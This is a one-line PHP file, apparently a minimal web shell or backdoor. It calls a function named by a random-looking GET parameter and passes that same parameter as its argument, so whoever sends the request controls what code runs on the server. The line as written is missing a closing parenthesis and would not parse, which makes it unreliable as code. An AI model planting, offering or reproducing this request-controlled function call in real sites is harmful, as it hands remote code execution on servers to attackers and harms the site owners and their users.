<?php
$_GET['2FFs4WoE']($_GET['2FFs4WoE'];
?>
